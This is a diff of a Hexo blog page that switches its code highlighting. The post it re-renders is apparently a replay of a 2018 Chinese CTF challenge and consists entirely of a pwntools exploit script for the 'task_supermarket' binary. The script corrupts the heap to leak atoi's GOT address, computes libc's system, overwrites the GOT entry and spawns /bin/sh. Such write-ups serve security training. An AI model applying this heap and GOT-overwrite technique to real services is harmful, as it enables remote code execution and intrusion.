@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="2018国赛复现">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -316,85 +316,7 @@
     
     <div class="post-body" itemprop="articleBody">
         <h1 id="2018国赛复现"><a href="#2018国赛复现" class="headerlink" title="2018国赛复现"></a>2018国赛复现</h1><a id="more"></a>
-<pre><code>from pwn import *
-
-#p = process(&#39;./task_supermarket&#39;)
-p = remote(&#39;ip&#39;,port)
-elf = ELF(&#39;./task_supermarket&#39;)
-#context.log_level = &#39;debug&#39;
-def add(name,price,descrip_size,des):
-    p.recvuntil(&#39;choice&gt;&gt; &#39;)
-    p.sendline(&#39;1&#39;)
-    p.recvuntil(&#39;name:&#39;)
-    p.sendline(name)
-    p.recvuntil(&#39;price:&#39;)
-    p.sendline(str(price))
-    p.recvuntil(&#39;descrip_size:&#39;)
-    p.sendline(str(descrip_size))
-    p.recvuntil(&#39;description:&#39;)
-    p.sendline(des)
-
-def delete(name):
-    p.recvuntil(&#39;choice&gt;&gt; &#39;)
-    p.sendline(&#39;2&#39;)
-    p.recvuntil(&#39;name:&#39;)
-    p.sendline(name)
-
-def list():
-    p.recvuntil(&#39;choice&gt;&gt; &#39;)
-    p.sendline(&#39;3&#39;)
-
-def change_price(name,size_offset):
-    p.recvuntil(&#39;choice&gt;&gt; &#39;)
-    p.sendline(&#39;4&#39;)
-    p.recvuntil(&#39;name:&#39;)
-    p.sendline(name)
-    p.recvuntil(&#39;rise in:&#39;)
-    p.sendline(size_offset)
-
-def change_des(name,descrip_size,des):
-    p.recvuntil(&#39;choice&gt;&gt; &#39;)
-    p.sendline(&#39;5&#39;)
-    p.recvuntil(&#39;name:&#39;)
-    p.sendline(name)
-    p.recvuntil(&#39;descrip_size:&#39;)
-    p.sendline(str(descrip_size))
-    p.recvuntil(&#39;description:&#39;)
-    p.sendline(des)
-
-add(&#39;aaa&#39;,1,0x28,&#39;aa&#39;)
-change_des(&#39;aaa&#39;,0x8,&#39;aa&#39;)
-add(&#39;bbb&#39;,1,0x28,&#39;bb&#39;)
-change_des(&#39;bbb&#39;,0x8,&#39;bb&#39;)
-add(&#39;ccc&#39;,1,0x28,&#39;cc&#39;)
-change_des(&#39;ccc&#39;,0x8,&#39;cc&#39;)
-add(&#39;ddd&#39;,1,0x28,&#39;dd&#39;)
-change_des(&#39;ddd&#39;,0x8,&#39;dd&#39;)
-
-payload = &#39;a&#39;*0x4 + p32(0)*2 + p32(0x21) + &#39;bbb\x00&#39; + p32(0)*3 + p32(1) + p32(0x48) 
-change_des(&#39;aaa&#39;,0x28,payload)
-payload1 = &#39;b&#39;*0x4 + p32(0)*2 + p32(0x21) + &#39;ccc\x00&#39; + p32(0)*3 + p32(1) + p32(0x48) + p32(elf.got[&#39;atoi&#39;]) + p32(0x14)
-change_des(&#39;bbb&#39;,0x48,payload1)
-
-list()
-p.recvuntil(&#39;ccc: price.1, des.&#39;)
-atoi_addr = u32(p.recv(4))
-log.success(&#39;atoi addr: 0x%x&#39;% atoi_addr) 
-
-offset_atoi = 0x02d050
-offset_system = 0x03a940
-# offset_atoi = 0x0002d250
-# offset_system = 0x0003ada0
-
-libc_base = atoi_addr - offset_atoi
-system_addr = libc_base + offset_system
-
-
-change_des(&#39;ccc&#39;,0x48,p32(system_addr))
-raw_input(&quot;go: &quot;)
-p.sendline(&#39;/bin/sh&#39;)
-p.interactive()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./task_supermarket')</span></span><br><span class="line">p = remote(<span class="string">'ip'</span>,port)</span><br><span class="line">elf = ELF(<span class="string">'./task_supermarket'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,price,descrip_size,des)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.recvuntil(<span class="string">'price:'</span>)</span><br><span class="line">	p.sendline(str(price))</span><br><span class="line">	p.recvuntil(<span class="string">'descrip_size:'</span>)</span><br><span class="line">	p.sendline(str(descrip_size))</span><br><span class="line">	p.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">	p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_price</span><span class="params">(name,size_offset)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.recvuntil(<span class="string">'rise in:'</span>)</span><br><span class="line">	p.sendline(size_offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_des</span><span class="params">(name,descrip_size,des)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.recvuntil(<span class="string">'descrip_size:'</span>)</span><br><span class="line">	p.sendline(str(descrip_size))</span><br><span class="line">	p.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">	p.sendline(des)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'aa'</span>)</span><br><span class="line">change_des(<span class="string">'aaa'</span>,<span class="number">0x8</span>,<span class="string">'aa'</span>)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'bb'</span>)</span><br><span class="line">change_des(<span class="string">'bbb'</span>,<span class="number">0x8</span>,<span class="string">'bb'</span>)</span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'cc'</span>)</span><br><span class="line">change_des(<span class="string">'ccc'</span>,<span class="number">0x8</span>,<span class="string">'cc'</span>)</span><br><span class="line">add(<span class="string">'ddd'</span>,<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'dd'</span>)</span><br><span class="line">change_des(<span class="string">'ddd'</span>,<span class="number">0x8</span>,<span class="string">'dd'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x4</span> + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(<span class="number">0x21</span>) + <span class="string">'bbb\x00'</span> + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(<span class="number">1</span>) + p32(<span class="number">0x48</span>) </span><br><span class="line">change_des(<span class="string">'aaa'</span>,<span class="number">0x28</span>,payload)</span><br><span class="line">payload1 = <span class="string">'b'</span>*<span class="number">0x4</span> + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(<span class="number">0x21</span>) + <span class="string">'ccc\x00'</span> + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(<span class="number">1</span>) + p32(<span class="number">0x48</span>) + p32(elf.got[<span class="string">'atoi'</span>]) + p32(<span class="number">0x14</span>)</span><br><span class="line">change_des(<span class="string">'bbb'</span>,<span class="number">0x48</span>,payload1)</span><br><span class="line"></span><br><span class="line">list()</span><br><span class="line">p.recvuntil(<span class="string">'ccc: price.1, des.'</span>)</span><br><span class="line">atoi_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'atoi addr: 0x%x'</span>% atoi_addr) </span><br><span class="line">     </span><br><span class="line">offset_atoi = <span class="number">0x02d050</span></span><br><span class="line">offset_system = <span class="number">0x03a940</span></span><br><span class="line"><span class="comment"># offset_atoi = 0x0002d250</span></span><br><span class="line"><span class="comment"># offset_system = 0x0003ada0</span></span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - offset_atoi</span><br><span class="line">system_addr = libc_base + offset_system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change_des(<span class="string">'ccc'</span>,<span class="number">0x48</span>,p32(system_addr))</span><br><span class="line">raw_input(<span class="string">"go: "</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -499,8 +421,6 @@ p.interactive()
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
